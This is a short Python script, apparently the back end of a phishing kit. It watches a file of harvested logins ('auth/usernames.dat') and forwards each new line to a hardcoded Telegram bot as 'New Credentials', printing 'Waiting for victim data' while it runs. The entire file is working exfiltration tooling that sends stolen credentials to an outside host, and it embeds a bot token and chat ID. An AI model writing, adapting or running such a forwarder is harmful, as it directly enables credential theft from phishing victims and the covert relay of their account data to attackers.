import time
import os
import requests

TOKEN = "8685356855:AAHXH8O3r0jJE-1j93tVDVdvefnn8kzyh-k"
CHAT_ID = "6772111715"
FILE_PATH = "auth/usernames.dat"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    try:
        r = requests.post(url, data=payload)
        print("Telegram Status:", r.status_code)
    except Exception as e:
        print("Error:", e)

print("Live Forwarder Active... Waiting for victim data.")

if not os.path.exists(FILE_PATH):
    os.makedirs("auth", exist_ok=True)
    open(FILE_PATH, 'a').close()

# File ke end par chale jao taaki sirf naya data hi pakde
with open(FILE_PATH, 'r') as f:
    f.seek(0, os.SEEK_END)
    while True:
        line = f.readline()
        if not line:
            time.sleep(0.5)
            continue
        if line.strip():
            send_telegram(f"🔥 New Credentials:\n{line.strip()}")
            print(f"[+] Forwarded: {line.strip()}")
